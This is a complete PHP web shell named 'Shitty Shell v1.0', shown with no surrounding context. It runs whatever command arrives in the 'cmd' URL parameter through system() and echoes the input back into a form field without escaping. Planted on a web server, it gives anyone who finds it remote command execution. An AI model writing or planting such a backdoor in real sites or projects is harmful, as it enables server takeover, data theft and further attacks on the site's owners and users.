<?php 
echo "<h2>Shitty Shell v1.0</h2>"; 
echo "<hr><form><pre>";
$c = $_GET['cmd'];
system($c); 
echo "</pre><hr>";
echo "% <input text name='cmd' value='$c'>";
echo "</form>";
?>
